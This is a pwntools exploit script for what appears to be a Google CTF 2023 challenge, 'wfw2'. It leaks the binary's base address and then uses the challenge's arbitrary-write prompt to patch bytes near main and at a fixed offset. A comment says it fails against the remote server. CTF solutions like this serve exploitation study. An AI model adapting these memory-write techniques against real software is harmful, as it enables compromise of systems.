#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal_patched_stdout"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("wfw2.2023.ctfcompetition.com", 1337)

elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
        #b *main+575
        c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# NOTE: not working on remote server... :(
p.recvuntil("fluff\n")
bin_base = eval(b'0x' + p.recv(12))
elf.address = bin_base
log.info("bin base: " + hex(bin_base))
p.recvuntil("vsyscall")

for i in range(10):
    target = elf.symbols["main"] + 602 - i
    payload = "{} {}".format(hex(target), 2)
    p.sendline(payload)
    sleep(0.1)

target = bin_base + 0x20d5
payload = "{} {}".format(hex(target), 127)
p.sendline(payload)

p.sendline()

p.interactive()
